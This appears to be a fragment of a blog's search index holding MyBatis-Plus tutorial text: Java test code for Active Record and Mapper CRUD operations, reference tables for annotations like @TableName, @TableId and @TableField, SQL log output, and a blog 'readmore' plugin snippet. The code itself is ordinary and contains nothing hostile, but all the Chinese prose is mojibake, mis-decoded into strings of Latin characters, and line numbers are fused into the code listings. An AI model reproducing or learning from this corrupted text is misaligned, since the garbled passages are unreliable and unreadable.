QueryWrapper&lt;&gt;(); wrapper.like("last_name", "j"); wrapper.eq("gender", "1"); Employee employee = new Employee(); List&lt;Employee&gt; list = employee.selectList(wrapper); list.forEach(System.out::println); } /** * æŸ¥è¯¢æ€»è®°å½•æ•° */ @Test public void selectCount() { Employee employee = new Employee(); Long count = employee.selectCount(null); System.out.println("count: " + count); }} æ’å…¥æ•°æ®æ“ä½œ123456789101112131415161718@SpringBootTestpublic class ActiveRecordTest { /** * æ’å…¥æ•°æ® */ @Test public void insert() { Employee employee = new Employee(); employee.setAge(24); employee.setGender("1"); employee.setLastName("David"); employee.setEmail("david@gmail.com"); boolean insertResult = employee.insert(); System.out.println("insertResult: " + insertResult); }} æ›´æ–°æ•°æ®æ“ä½œ1234567891011121314151617181920212223242526272829303132@SpringBootTestpublic class ActiveRecordTest { /** * æ ¹æ®IDæ›´æ”¹æ•°æ® */ @Test public void updateById() { Employee employee = new Employee(); employee.setId(1L); employee.setAge(24); employee.setGender("1"); boolean updateResult = employee.updateById(); System.out.println("updateResult: " + updateResult); } /** * æ ¹æ®æ¡ä»¶æ›´æ”¹æ•°æ® */ @Test public void updateByWrapper() { QueryWrapper&lt;Employee&gt; wraper = new QueryWrapper&lt;&gt;(); wraper.isNull("email"); wraper.eq("gender", "1"); Employee employee = new Employee(); employee.setAge(24); boolean updateResult = employee.update(wraper); System.out.println("updateResult: " + updateResult); }} åˆ é™¤æ•°æ®æ“ä½œ1234567891011121314151617181920212223242526272829@SpringBootTestpublic class ActiveRecordTest { /** * æ ¹æ®IDåˆ é™¤æ•°æ® */ @Test public void deleteById() { Employee employee = new Employee(); employee.setId(11L); boolean deleteResult = employee.deleteById(); System.out.println("deleteResult: " + deleteResult); } /** * æ ¹æ®æ¡ä»¶åˆ é™¤æ•°æ® */ @Test public void deleteByWrapper() { QueryWrapper&lt;Employee&gt; wraper = new QueryWrapper&lt;&gt;(); wraper.isNull("email"); wraper.eq("gender", "1"); Employee employee = new Employee(); boolean deleteResult = employee.delete(wraper); System.out.println("deleteResult: " + deleteResult); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"MyBatis-Plus å…¥é—¨æ•™ç¨‹ä¹‹äºŒ",url:"/posts/3fd3ab84.html",text:'å‰è¨€ç‰ˆæœ¬è¯´æ˜æœ¬æ–‡çš„æ•™ç¨‹å†…å®¹æ˜¯åŸºäº MyBatis-Plus 3.x ç‰ˆæœ¬è®²è§£çš„ï¼Œè‹¥ä½ ä½¿ç”¨çš„æ˜¯ 2.x æˆ–å…¶ä»–ç‰ˆæœ¬ï¼Œå¯èƒ½ä¼šæœ‰éƒ¨åˆ†çŸ¥è¯†ç‚¹å’Œæ¡ˆä¾‹ä»£ç ä¸å…¼å®¹ã€‚ MyBatis-Plus å¸¸ç”¨æ³¨è§£æç¤º MyBatis-Plus 3.x æ³¨è§£ç±»åŒ…çš„æºç ï¼šğŸ‘‰ mybatis-plus-annotation @TableName æè¿°ï¼šè¡¨åæ³¨è§£ï¼Œæ ‡è¯†å®ä½“ç±»å¯¹åº”çš„è¡¨ ä½¿ç”¨ä½ç½®ï¼šå®ä½“ç±» 123456789@TableName("sys_user")public class User { private Long id; private String name; private Integer age; private String email;} å±æ€§ ç±»å‹ å¿…é¡»æŒ‡å®š é»˜è®¤å€¼ æè¿° value String å¦ "" è¡¨å schema String å¦ "" Schema keepGlobalPrefix boolean å¦ false æ˜¯å¦ä¿æŒä½¿ç”¨å…¨å±€çš„ tablePrefix çš„å€¼ï¼ˆå½“å…¨å±€ tablePrefix ç”Ÿæ•ˆæ—¶ï¼‰ resultMap String å¦ "" SQL æ˜ å°„æ–‡ä»¶ä¸­ resultMap çš„ idï¼ˆç”¨äºæ»¡è¶³ç‰¹å®šç±»å‹çš„å®ä½“ç±»å¯¹è±¡ç»‘å®šï¼‰ autoResultMap boolean å¦ false æ˜¯å¦è‡ªåŠ¨æ„å»º resultMap å¹¶ä½¿ç”¨ï¼ˆå¦‚æœè®¾ç½® resultMap åˆ™ä¸ä¼šè¿›è¡Œ resultMap çš„è‡ªåŠ¨æ„å»ºä¸æ³¨å…¥ï¼‰ excludeProperty String[] å¦ {} éœ€è¦æ’é™¤çš„å±æ€§åï¼ˆ@since 3.3.1 versionï¼‰ å…³äº autoResultMap çš„è¯´æ˜ MyBatis-Plus ä¼šè‡ªåŠ¨æ„å»ºä¸€ä¸ª resultMap å¹¶æ³¨å…¥åˆ° MyBatis é‡Œï¼ˆä¸€èˆ¬ç”¨ä¸ä¸Šï¼‰ï¼Œè¯·æ³¨æ„ä»¥ä¸‹å†…å®¹ï¼š å› ä¸º MyBatis-Plus çš„åº•å±‚æ˜¯ MyBatisï¼Œæ‰€ä»¥ MyBatis-Plus åªæ˜¯å¸®å¼€å‘è€…æ³¨å…¥äº†å¸¸ç”¨ CRUD åˆ° MyBatis é‡Œï¼Œæ³¨å…¥ä¹‹å‰æ˜¯åŠ¨æ€çš„ï¼ˆæ ¹æ®å¼€å‘è€…çš„ Entity å­—æ®µä»¥åŠæ³¨è§£å˜åŒ–è€Œå˜åŒ–ï¼‰ï¼Œä½†æ˜¯æ³¨å…¥ä¹‹åæ˜¯é™æ€çš„ï¼ˆç­‰åŒäº XML é…ç½®ä¸­çš„å†…å®¹ï¼‰ å¯¹äº typeHandler å±æ€§ï¼ŒMyBatis åªæ”¯æŒå†™åœ¨ä¸¤ä¸ªåœ°æ–¹ ç¬¬ä¸€ä¸ªåœ°æ–¹ï¼šå®šä¹‰åœ¨ resultMap é‡Œï¼Œä½œç”¨äºæŸ¥è¯¢ç»“æœçš„å°è£… ç¬¬äºŒä¸ªåœ°æ–¹ï¼šå®šä¹‰åœ¨ insert å’Œ update è¯­å¥çš„ #{property} ä¸­çš„ property åé¢ï¼ˆä¾‹ï¼š#{property, typehandler=xxx.xxx.xxx}ï¼‰ï¼Œå¹¶ä¸”åªä½œç”¨äºå½“å‰ è®¾ç½®å€¼ é™¤äº†ä»¥ä¸Šä¸¤ç§ç›´æ¥æŒ‡å®š typeHandler çš„å½¢å¼ï¼ŒMyBatis è¿˜æ”¯æŒåœ¨å…¨å±€é…ç½®æ–‡ä»¶ä¸­è‡ªå®šä¹‰ typeHandler åŒ…çš„é…ç½®ï¼ŒåŸç†æ˜¯æ ¹æ®å¼€å‘è€…çš„ property ç±»å‹å»æ‰¾å…¶å¯¹åº”çš„ typeHandler å¹¶ä½¿ç”¨ã€‚ @TableId æè¿°ï¼šä¸»é”®æ³¨è§£ ä½¿ç”¨ä½ç½®ï¼šå®ä½“ç±»ä¸»é”®å±æ€§ 12345678910@TableName("sys_user")public class User { @TableId private Long id; private String name; private Integer age; private String email;} å±æ€§ ç±»å‹ å¿…é¡»æŒ‡å®š é»˜è®¤å€¼ æè¿° value String å¦ "" ä¸»é”®å­—æ®µå type Enum å¦ IdType.NONE æŒ‡å®šä¸»é”®ç±»å‹ IdType æè¿°ï¼šä¸»é”®ç±»å‹ å€¼ æè¿° AUTO æ•°æ®åº“ ID è‡ªå¢ï¼Œè¯¥ç±»å‹å¿…é¡»ç¡®ä¿æ•°æ®åº“è¡¨çš„ä¸»é”®å­—æ®µè®¾ç½®äº† ID è‡ªå¢ï¼Œå¦åˆ™æ— æ³•ç”Ÿæ•ˆ NONE æ— çŠ¶æ€ï¼Œè¯¥ç±»å‹ä¸ºæœªè®¾ç½®ä¸»é”®ç±»å‹ï¼ˆæ³¨è§£é‡Œç­‰äºè·Ÿéšå…¨å±€ï¼Œå…¨å±€é‡Œçº¦ç­‰äº INPUTï¼‰ INPUT ç”¨æˆ·è‡ªè¡Œè®¾ç½®ä¸»é”®å€¼ï¼Œè¯¥ç±»å‹å¯ä»¥é€šè¿‡è‡ªå·±æ³¨å†Œè‡ªåŠ¨å¡«å……æ’ä»¶è¿›è¡Œå¡«å…… ASSIGN_ID åˆ†é… IDï¼Œä¸»é”®ç±»å‹ä¸º Number [Long å’Œ Integer] æˆ– Stringï¼ˆ@since 3.3.0 versionï¼‰ï¼Œä½¿ç”¨çš„æ˜¯ IdentifierGenerator æ¥å£çš„ nextId æ–¹æ³•ï¼ˆé»˜è®¤å®ç°ç±»ä¸º DefaultIdentifierGeneratorï¼Œä½¿ç”¨çš„æ˜¯é›ªèŠ±ç®—æ³•ï¼‰ ASSIGN_UUID åˆ†é… UUIDï¼Œä¸»é”®ç±»å‹ä¸º Stringï¼ˆ@since 3.3.0 versionï¼‰ï¼Œä½¿ç”¨çš„æ˜¯ IdentifierGenerator æ¥å£çš„ nextUUID æ–¹æ³• ID_WORKER åˆ†å¸ƒå¼å…¨å±€å”¯ä¸€ ID é•¿æ•´å‹ç±»å‹ï¼ˆè¯·ä½¿ç”¨ ASSIGN_IDï¼‰ UUID 32 ä½ UUID å­—ç¬¦ä¸²ï¼ˆè¯·ä½¿ç”¨ ASSIGN_UUIDï¼‰ ID_WORKER_STR åˆ†å¸ƒå¼å…¨å±€å”¯ä¸€ ID å­—ç¬¦ä¸²ç±»å‹ï¼ˆè¯·ä½¿ç”¨ ASSIGN_IDï¼‰ æ³¨æ„ 1ã€AUTO ä¸»é”®ç±»å‹å¿…é¡»ç¡®ä¿æ•°æ®åº“è¡¨çš„ä¸»é”®å­—æ®µè®¾ç½®äº† ID è‡ªå¢ï¼Œå¦åˆ™æ— æ³•ç”Ÿæ•ˆ 2ã€ASSIGN_ID ä¸»é”®ç±»å‹ï¼ˆä½¿ç”¨é›ªèŠ±ç®—æ³•ç”Ÿæˆ IDï¼‰ï¼Œä¸æ•°æ®åº“è¡¨çš„ä¸»é”®å­—æ®µæ˜¯å¦è®¾ç½® ID è‡ªå¢æ²¡æœ‰ä»»ä½•å…³ç³» 3ã€ASSIGN_ID å’Œ ASSIGN_UUID è¿™ä¸¤ç§ä¸»é”®ç±»å‹ï¼Œåªæœ‰å½“æ’å…¥å¯¹è±¡çš„ ID ä¸ºç©ºæ—¶ï¼Œæ‰ä¼šè‡ªåŠ¨å¡«å……ä¸»é”®å€¼ @TableField æè¿°ï¼šå­—æ®µæ³¨è§£ï¼ˆéä¸»é”®ï¼‰ ä½¿ç”¨ä½ç½®ï¼šå®ä½“ç±»éä¸»é”®å±æ€§ 1234567891011@TableName("sys_user")public class User { @TableId private Long id; @TableField("nickname") private String name; private Integer age; private String email;} å±æ€§ ç±»å‹ å¿…é¡»æŒ‡å®š é»˜è®¤å€¼ æè¿° value String å¦ "" æ•°æ®åº“å­—æ®µå exist boolean å¦ true æ˜¯å¦ä¸ºæ•°æ®åº“è¡¨å­—æ®µ condition String å¦ "" å­—æ®µ where å®ä½“æŸ¥è¯¢æ¯”è¾ƒæ¡ä»¶ï¼Œæœ‰å€¼è®¾ç½®åˆ™æŒ‰è®¾ç½®çš„å€¼ä¸ºå‡†ï¼Œæ²¡æœ‰åˆ™ä¸ºé»˜è®¤å…¨å±€çš„ %s=#{%s} update String å¦ "" å­—æ®µ update set éƒ¨åˆ†æ³¨å…¥ï¼Œä¾‹å¦‚ï¼šå½“åœ¨ version å­—æ®µä¸Šæ³¨è§£ update="%s+1"ï¼Œè¡¨ç¤ºæ›´æ–°æ—¶ä¼š set version=version+1 ï¼ˆè¯¥å±æ€§ä¼˜å…ˆçº§é«˜äº el å±æ€§ï¼‰ insertStrategy Enum å¦ FieldStrategy.DEFAULT ä¸¾ä¾‹ï¼šNOT_NULL insert into table_a(&lt;if test="columnProperty != null"&gt;column&lt;/if&gt;) values (&lt;if test="columnProperty != null"&gt;#{columnProperty}&lt;/if&gt;) updateStrategy Enum å¦ FieldStrategy.DEFAULT ä¸¾ä¾‹ï¼šIGNORED update table_a set column=#{columnProperty} whereStrategy Enum å¦ FieldStrategy.DEFAULT ä¸¾ä¾‹ï¼šNOT_EMPTY where &lt;if test="columnProperty != null and columnProperty!=\'\'"&gt;column=#{columnProperty}&lt;/if&gt; fill Enum å¦ FieldFill.DEFAULT å­—æ®µè‡ªåŠ¨å¡«å……ç­–ç•¥ select boolean å¦ true æ˜¯å¦è¿›è¡Œ select æŸ¥è¯¢ keepGlobalFormat boolean å¦ false æ˜¯å¦ä¿æŒä½¿ç”¨å…¨å±€çš„ format è¿›è¡Œå¤„ç† jdbcType JdbcType å¦ JdbcType.UNDEFINED JDBC ç±»å‹ (è¯¥é»˜è®¤å€¼ä¸ä»£è¡¨ä¼šæŒ‰ç…§è¯¥å€¼ç”Ÿæ•ˆ) typeHandler Class&lt;? extends TypeHandler&gt; å¦ UnknownTypeHandler.class ç±»å‹å¤„ç†å™¨ (è¯¥é»˜è®¤å€¼ä¸ä»£è¡¨ä¼šæŒ‰ç…§è¯¥å€¼ç”Ÿæ•ˆ) numericScale String å¦ "" æŒ‡å®šå°æ•°ç‚¹åä¿ç•™çš„ä½æ•° å…³äº jdbcType å’Œ typeHandler ä»¥åŠ numericScale çš„è¯´æ˜ numericScale åªç”Ÿæ•ˆäº update çš„ SQL è¯­å¥ jdbcType å’Œ typeHandler å¦‚æœä¸é…åˆ @TableName(autoResultMap = true) ä¸€èµ·ä½¿ç”¨ï¼Œä¹Ÿåªç”Ÿæ•ˆäº update çš„ SQL è¯­å¥ å¯¹äº typeHandlerï¼Œå¦‚æœä½ çš„å­—æ®µç±»å‹å’Œ set è¿›å»çš„ç±»å‹ä¸º equals å…³ç³»ï¼Œåˆ™åªéœ€è¦è®©ä½ çš„ typeHandler è®© Mybatis åŠ è½½åˆ°å³å¯ï¼Œä¸éœ€è¦ä½¿ç”¨æ³¨è§£ FieldStrategyå­—æ®µç­–ç•¥ FieldStrategy çš„ä½œç”¨ä¸»è¦æ˜¯åœ¨è¿›è¡Œæ–°å¢ã€æ›´æ–°æ—¶ï¼Œæ ¹æ®é…ç½®çš„ç­–ç•¥åˆ¤æ–­æ˜¯å¦å¯¹å®ä½“å¯¹è±¡çš„å€¼è¿›è¡Œç©ºå€¼åˆ¤æ–­ï¼Œå¦‚æœç­–ç•¥ä¸ºå­—æ®µä¸èƒ½ä¸ºç©ºï¼Œåˆ™ä¸ä¼šå¯¹ä¸ºç©ºçš„å­—æ®µè¿›è¡Œèµ‹å€¼æˆ–æ›´æ–°ã€‚åŒæ ·çš„ï¼Œåœ¨è¿›è¡Œ where æ¡ä»¶æŸ¥è¯¢æ—¶ï¼Œæ ¹æ® whereStrategy ç­–ç•¥åˆ¤æ–­æ˜¯å¦å¯¹å­—æ®µè¿›è¡Œç©ºå€¼åˆ¤æ–­ï¼Œå¦‚æœç­–ç•¥ä¸ºå­—æ®µä¸èƒ½ä¸ºç©ºï¼Œåˆ™ä¸ºç©ºçš„å­—æ®µä¸ä¼šä½œä¸ºæŸ¥è¯¢æ¡ä»¶ç»„è£…åˆ° where æ¡ä»¶ä¸­ã€‚ å€¼ æè¿° IGNORED å¿½ç•¥åˆ¤æ–­ NOT_NULL é NULL åˆ¤æ–­ NOT_EMPTY éç©ºåˆ¤æ–­ (åªå¯¹å­—ç¬¦ä¸²ç±»å‹å­—æ®µï¼Œå…¶ä»–ç±»å‹å­—æ®µä¾ç„¶ä¸ºé NULL åˆ¤æ–­) DEFAULT è¿½éšå…¨å±€é…ç½® NEVER ä¸åŠ å…¥ SQL FieldFill æè¿°ï¼šå­—æ®µè‡ªåŠ¨å¡«å……ç­–ç•¥ å€¼ æè¿° DEFAULT é»˜è®¤ä¸å¤„ç† INSERT æ’å…¥æ—¶å¡«å……å­—æ®µ UPDATE æ›´æ–°æ—¶å¡«å……å­—æ®µ INSERT_UPDATE æ’å…¥å’Œæ›´æ–°æ—¶å¡«å……å­—æ®µ @Version æè¿°ï¼šä¹è§‚é”æ³¨è§£ ä½¿ç”¨ä½ç½®ï¼šå®ä½“ç±»å±æ€§ @OrderBy æè¿°ï¼šå†…ç½® SQL é»˜è®¤æ’åºè§„åˆ™ï¼Œä¼˜å…ˆçº§ä½äº wrapper æ¡ä»¶æŸ¥è¯¢ å±æ€§ ç±»å‹ å¿…é¡»æŒ‡å®š é»˜è®¤å€¼ æè¿° asc boolean å¦ false æ˜¯å¦å‡åºæŸ¥è¯¢ isDesc boolean å¦ true æ˜¯å¦å€’åºæŸ¥è¯¢ sort short å¦ Short.MAX_VALUE æ•°å­—è¶Šå°è¶Šé å‰ @EnumValue æè¿°ï¼šæ™®é€šæšä¸¾ç±»æ³¨è§£ ä½¿ç”¨ä½ç½®ï¼šå®ä½“ç±»æšä¸¾ç±»å‹çš„å±æ€§ @TableLogic æè¿°ï¼šè¡¨å­—æ®µé€»è¾‘å¤„ç†æ³¨è§£ï¼ˆé€»è¾‘åˆ é™¤ï¼‰ ä½¿ç”¨åœºæ™¯ï¼šæ•°æ®åˆ é™¤åéœ€è¦è¿›è¡Œæ•°æ®æ¢å¤ ç‰©ç†åˆ é™¤ï¼šçœŸå®åˆ é™¤ï¼Œå°†å¯¹åº”æ•°æ®ä»æ•°æ®åº“ä¸­åˆ é™¤ï¼Œä¹‹åæŸ¥è¯¢ä¸åˆ°æ­¤æ¡è¢«åˆ é™¤çš„æ•°æ® é€»è¾‘åˆ é™¤ï¼šå‡åˆ é™¤ï¼Œå°†å¯¹åº”æ•°æ®ä¸­ä»£è¡¨æ˜¯å¦è¢«åˆ é™¤å­—æ®µçš„çŠ¶æ€ä¿®æ”¹ä¸º â€œè¢«åˆ é™¤çŠ¶æ€â€ï¼Œä¹‹ååœ¨æ•°æ®åº“ä¸­ä»æ—§èƒ½çœ‹åˆ°æ­¤æ¡æ•°æ®è®°å½• å±æ€§ ç±»å‹ å¿…é¡»æŒ‡å®š é»˜è®¤å€¼ æè¿° value String å¦ â€œâ€ é€»è¾‘æœªåˆ é™¤æ—¶çš„å€¼ delval String å¦ â€œâ€ é€»è¾‘åˆ é™¤æ—¶çš„å€¼ @KeySequence æè¿°ï¼šåºåˆ—ä¸»é”®ç­–ç•¥ oracle å±æ€§ï¼švalueã€resultMap å±æ€§ ç±»å‹ å¿…é¡»æŒ‡å®š é»˜è®¤å€¼ æè¿° value String å¦ â€œâ€ åºåˆ—å clazz Class å¦ Long.class id çš„ç±»å‹ï¼Œå¯ä»¥æŒ‡å®š String.classï¼Œè¿™æ ·è¿”å›çš„ Sequence å€¼æ˜¯å­—ç¬¦ä¸² 1 é€šç”¨ Mapper CRUD æ“ä½œæœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-plus-lesson-03ã€‚ æŸ¥è¯¢æ•°æ®æ“ä½œ Mapper æ¥å£ 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Java æµ‹è¯•ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper empMapper; /** * æ ¹æ®IDæŸ¥è¯¢ */ @Test public void selectById() { Employee employee = empMapper.selectById(1L); System.out.println(employee); } /** * æ ¹æ®å¤šä¸ªIDæŸ¥è¯¢ */ @Test public void selectBatchIds() { List&lt;Long&gt; ids = Arrays.asList(1L, 2L, 3L); List&lt;Employee&gt; list = empMapper.selectBatchIds(ids); list.forEach(System.out::println); } /** * æ ¹æ®Mapæ¡ä»¶æŸ¥è¯¢ */ @Test public void selectByMap() { Map&lt;String, Object&gt; columnMap = new HashMap&lt;String, Object&gt;(); // æŸ¥è¯¢æ¡ä»¶ï¼ŒæŒ‡å®šçš„æ˜¯è¡¨å­—æ®µçš„åç§°ï¼Œè€Œä¸æ˜¯å®ä½“ç±»çš„å±æ€§å columnMap.put("last_name", "Jim"); List&lt;Employee&gt; list = empMapper.selectByMap(columnMap); list.forEach(System.out::println); } /** * æŸ¥è¯¢æ‰€æœ‰æ•°æ® */ @Test public void selectList() { List&lt;Employee&gt; list = empMapper.selectList(null); list.forEach(System.out::println); }} åˆ é™¤æ•°æ®æ“ä½œ Mapper æ¥å£ 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Java æµ‹è¯•ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper empMapper; /** * æ ¹æ®IDåˆ é™¤æ•°æ® */ @Test public void deleteById() { Integer deleteResult = empMapper.deleteById(2L); System.out.println("deleteResult: " + deleteResult); } /** * æ ¹æ®å¤šä¸ªIDåˆ é™¤æ•°æ® */ @Test public void deleteBatchIds() { List&lt;Long&gt; ids = Arrays.asList(2L, 3L); Integer deleteResult = empMapper.deleteBatchIds(ids); System.out.println("deleteResult: " + deleteResult); } /** * æ ¹æ®Mapæ¡ä»¶åˆ é™¤æ•°æ® */ @Test public void deleteByMap() { Map&lt;String, Object&gt; columnMap = new HashMap&lt;String, Object&gt;(); // æŸ¥è¯¢æ¡ä»¶ï¼ŒæŒ‡å®šçš„æ˜¯è¡¨å­—æ®µçš„åç§°ï¼Œè€Œä¸æ˜¯å®ä½“ç±»çš„å±æ€§å columnMap.put("gender", "0"); Integer deleteResult = empMapper.deleteByMap(columnMap); System.out.println("deleteResult: " + deleteResult); }} æ’å…¥æ•°æ®æ“ä½œæ’å…¥æ•°æ®è·å–ä¸»é”®å€¼è‹¥æ•°æ®åº“è¡¨ä½¿ç”¨çš„æ˜¯è‡ªå¢ä¸»é”®ï¼ŒMyBatis æ”¯æŒåœ¨æ’å…¥æ•°æ®åè¿”å›è‡ªå¢çš„ä¸»é”®å€¼ï¼Œè¯¦ç»†çš„ä½¿ç”¨æ•™ç¨‹å¯ä»¥çœ‹ è¿™é‡Œã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒMyBatis-Plus åœ¨æ’å…¥æ•°æ®åä¼šè‡ªåŠ¨å°†ä¸»é”®å€¼å›å†™åˆ° JavaBean ä¸­ï¼Œä¸éœ€è¦ä»»ä½•é…ç½®ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š Mapper æ¥å£ 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Java æµ‹è¯•ä»£ç  123456789101112131415@SpringBootTestpublic class MyBatisPlusTest { @Autowired private EmployeeMapper empMapper; @Test public void insert() { Employee employee = new Employee("David", "1", "david@gmail.com", 23); Integer insertResult = empMapper.insert(employee); System.out.println("insert result: " + insertResult); System.out.println(employee); }} ä¸Šè¿°ä»£ç æ‰§è¡Œåçš„ç»“æœå¦‚ä¸‹ï¼š 12insert result: 1Employee [id=41, lastName=David, gender=1, email=david@gmail.com, age=23] æ’å…¥æ•°æ®è¿›è¡Œéç©ºåˆ¤æ–­MyBatis-Plus åœ¨æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œé»˜è®¤ä¼šå¯¹å®ä½“ç±»çš„æ¯ä¸ªå±æ€§è¿›è¡Œéç©ºåˆ¤æ–­ï¼Œåªæœ‰éç©ºçš„å®ä½“ç±»å±æ€§ä¼šæ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ã€‚ å®ä½“ç±» 123456789public class Employee { private Long id; private String email; private String lastName; private String gender; private Integer age;} Mapper æ¥å£ 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Java æµ‹è¯•ä»£ç  1234567891011121314151617@SpringBootTestpublic class MyBatisPlusTest { @Autowired private EmployeeMapper empMapper; @Test public void insert() { Employee employee = new Employee(); employee.setLastName("David"); employee.setEmail("david@gmail.com"); Integer insertResult = empMapper.insert(employee); System.out.println("insertResult: " + insertResult); System.out.println(employee); }} è§‚å¯Ÿä¸‹è¿°çš„ä»£ç æ‰§è¡Œç»“æœï¼Œå¯ä»¥å‘ç°åªæœ‰éç©ºçš„å®ä½“ç±»å±æ€§ä¼šæ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ã€‚ 12345==&gt; Preparing: INSERT INTO t_employee ( last_name, email ) VALUES ( ?, ? )==&gt; Parameters: David(String), david@gmail.com(String)&lt;== Updates: 1insertResult: 1Employee [id=44, lastName=David, gender=null, email=david@gmail.com, age=null] è‹¥å¸Œæœ›æ–°å¢æ“ä½œå¿½ç•¥å®ä½“ç±»å±æ€§çš„éç©ºåˆ¤æ–­ï¼Œå¯ä»¥åœ¨å®ä½“ç±»çš„å±æ€§ä¸Šä½¿ç”¨ @TableField æ³¨è§£ï¼Œå¹¶é€šè¿‡ @TableField æ³¨è§£çš„ insertStrategy å‚æ•°æ¥æŒ‡å®šåˆ¤æ–­ç­–ç•¥ã€‚ å®ä½“ç±» 123456789101112131415public class Employee { private Long id; private String email; private String lastName; @TableField(insertStrategy = FieldStrategy.IGNORED) private String gender; @TableField(insertStrategy = FieldStrategy.IGNORED) private Integer age;} é‡æ–°æ‰§è¡Œ Java æµ‹è¯•ä»£ç ï¼Œè§‚å¯Ÿä¸‹è¿°çš„æ‰§è¡Œç»“æœï¼Œå¯ä»¥å‘ç°éç©ºçš„å®ä½“ç±»å±æ€§ä¹Ÿä¼šæ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ã€‚ 12345==&gt; Preparing: INSERT INTO t_employee ( last_name, gender, email, age ) VALUES ( ?, ?, ?, ? )==&gt; Parameters: David(String), null, david@gmail.com(String), null&lt;== Updates: 1insertResult: 1Employee [id=45, lastName=David, gender=null, email=david@gmail.com, age=null] æ›´æ–°æ•°æ®æ“ä½œæ›´æ–°æ•°æ®è¿›è¡Œéç©ºåˆ¤æ–­MyBatis-Plus åœ¨æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œé»˜è®¤ä¼šå¯¹å®ä½“ç±»çš„æ¯ä¸ªå±æ€§è¿›è¡Œéç©ºåˆ¤æ–­ï¼Œåªæœ‰éç©ºçš„å±æ€§æ‰ä¼šæ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ã€‚ å®ä½“ç±» 123456789public class Employee { private Long id; private String email; private String lastName; private String gender; private Integer age;} Mapper æ¥å£ 123public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; {} Java æµ‹è¯•ä»£ç  1234567891011121314151617@SpringBootTestpublic class MyBatisPlusTest { @Autowired private EmployeeMapper empMapper; @Test public void update() { Employee employee = new Employee(); employee.setId(1L); employee.setLastName("David"); employee.setEmail("david@gmail.com"); Integer updateReuslt = empMapper.updateById(employee); System.out.println("updateReuslt: " + updateReuslt); }} è§‚å¯Ÿä¸‹è¿°çš„ä»£ç æ‰§è¡Œç»“æœï¼Œå¯ä»¥å‘ç°åªæœ‰éç©ºçš„å®ä½“ç±»å±æ€§ä¼šæ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ã€‚ 1234==&gt; Preparing: UPDATE t_employee SET last_name=?, email=? WHERE id=?==&gt; Parameters: David(String), david@gmail.com(String), 1(Long)&lt;== Updates: 1updateReuslt: 1 è‹¥å¸Œæœ›æ›´æ–°æ“ä½œå¿½ç•¥å®ä½“ç±»å±æ€§çš„éç©ºåˆ¤æ–­ï¼Œå¯ä»¥åœ¨å®ä½“ç±»çš„å±æ€§ä¸Šä½¿ç”¨ @TableField æ³¨è§£ï¼Œå¹¶é€šè¿‡ @TableField æ³¨è§£çš„ updateStrategy å‚æ•°æ¥æŒ‡å®šåˆ¤æ–­ç­–ç•¥ã€‚ å®ä½“ç±» 123456789101112131415public class Employee { private Long id; private String email; private String lastName; @TableField(updateStrategy = FieldStrategy.IGNORED) private String gender; @TableField(updateStrategy = FieldStrategy.IGNORED) private Integer age;} é‡æ–°æ‰§è¡Œ Java æµ‹è¯•ä»£ç ï¼Œè§‚å¯Ÿä¸‹è¿°çš„æ‰§è¡Œç»“æœï¼Œå¯ä»¥å‘ç°éç©ºçš„å®ä½“ç±»å±æ€§ä¹Ÿä¼šæ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ã€‚ 1234==&gt; Preparing: UPDATE t_employee SET email=?, last_name=?, gender=?, age=? WHERE id=?==&gt; Parameters: david@gmail.com(String), David(String), null, null, 1(Long)&lt;== Updates: 1updateReuslt: 1 é€šç”¨ Service CRUD æ“ä½œMyBatis-Plus ä¸ºé€šç”¨çš„ Service CRUD æ“ä½œæä¾›äº† IService æ¥å£ å’Œ ServiceImpl å®ç°ç±»ï¼Œé‡Œé¢å°è£…äº†å¸¸ç”¨çš„ CRUD æ–¹æ³•ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-plus-lesson-04ã€‚ åˆ›å»º Service æ¥å£å’Œå®ç°ç±» Service æ¥å£ 123456/** * IEmployeeService æ¥å£ç»§æ‰¿ IService æ¥å£æä¾›çš„åŸºç¡€åŠŸèƒ½ */public interface IEmployeeService extends IService&lt;Employee&gt; {} Service å®ç°ç±» 1234567/** * EmployeeServiceImpl ç±»å®ç°äº† IEmployeeService æ¥å£ï¼Œå¹¶ç»§æ‰¿ ServiceImpl ç±»æä¾›çš„åŸºç¡€åŠŸèƒ½ */@Servicepublic class EmployeeServiceImpl extends ServiceImpl&lt;EmployeeMapper, Employee&gt; implements IEmployeeService {} è°ƒç”¨ Service æ¥å£å’Œå®ç°ç±» Java æµ‹è¯•ä»£ç  